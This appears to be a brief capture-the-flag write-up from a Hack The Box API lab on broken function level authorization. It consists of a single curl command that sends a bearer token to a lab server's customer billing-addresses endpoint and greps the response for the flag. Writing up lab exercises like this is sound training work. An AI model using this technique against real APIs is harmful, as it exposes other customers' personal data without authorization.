# [Broken Function Level Authorization](Broken%20Function%20Level%20Authorization.md)
### Exploit another Broken Function Level Authorization vulnerability and submit the flag.

```sh
curl -X 'GET' \
  'http://154.57.164.67:31861/api/v1/customers/billing-addresses' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjlAaGFja3RoZWJveC5jb20iLCJleHAiOjE3ODk0NjA2MjQsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.7catOj6t16SBjgaNtSFPoLTaSIyMBrqSUyFxMVbA-uspu9wXpmswPK8X9AtivaFJDtPI2a_ZtTEuraJrDog4oQ' | grep HTB
```
![](Screenshot%202026-09-15%20at%2015.07.15.png)